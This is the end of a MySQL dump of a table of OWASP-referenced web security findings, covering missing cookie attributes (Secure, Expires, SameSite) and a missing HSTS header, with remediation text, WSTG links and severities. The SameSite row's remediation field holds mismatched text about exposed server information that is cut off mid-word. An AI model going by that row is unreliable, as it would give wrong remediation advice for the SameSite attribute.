(591, 'Missing Secure Attribute in Cookie Header', 'The Secure attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as HTTPS. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both HTTP and HTTPS, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.', 'Implement Secure Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 136, 'Low'),
(592, 'Missing Expires Attribute in Cookie Header', 'The Expires attribute is used to:\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n- Unlike session cookies, persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.', 'Implement Expires Attribute in Cookies', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 136, 'Low'),
(593, 'Missing SameSite Attribute in Cookie Header', 'The SameSite attribute is used to assert that a cookie ought not to be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-orgin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent cross-site request forgery attacks.', 'While exposed server information is not necessarily in itself a vulnerability, it is information that can assist attackers in exploiting other vulnerabilities that may exist. Exposed server information can also lead attackers to find version-specific serv', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes', NULL, 'WSTG-SESS-02', 136, 'Low'),
(594, 'Missing HTTP Strict Transport Security Header', 'HTTP Strict Transport Security (HSTS) feature lets a web application inform the browser through the use of a special response header that it should never establish a connection to the specified domain servers using un-encrypted HTTP. Instead, it should automatically establish all connection requests to access the site through HTTPS. It also prevents users from overriding certificate errors.', 'Implement HSTS header.Here’s an example of the HSTS header implementation:\nStrict-Transport-Security: max-age=31536000; includeSubDomains', 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security', NULL, 'WSTG-CONF-07', 136, 'Low');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `owasp`
--
ALTER TABLE `owasp`
  ADD PRIMARY KEY (`OID`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `owasp`
--
ALTER TABLE `owasp`
  MODIFY `OID` int NOT NULL AUTO_INCREMENT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
